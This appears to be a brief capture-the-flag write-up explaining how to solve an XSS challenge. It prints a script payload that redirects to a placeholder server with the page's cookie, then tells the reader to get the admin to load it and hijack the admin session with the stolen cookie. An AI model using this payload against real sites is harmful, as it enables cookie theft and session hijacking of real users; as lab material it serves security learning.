This requires you to xss the page, and leak the cookie. Add a page with `<script>location.href='(server)?cookie'+document.cookie</script>`. Then report abuse on it, and you'll get the cookie of the admin!

Next, just use a cookie editor to insert the session id into your own session. Now you've hijacked the session of the admin! The flag is simply named Flag.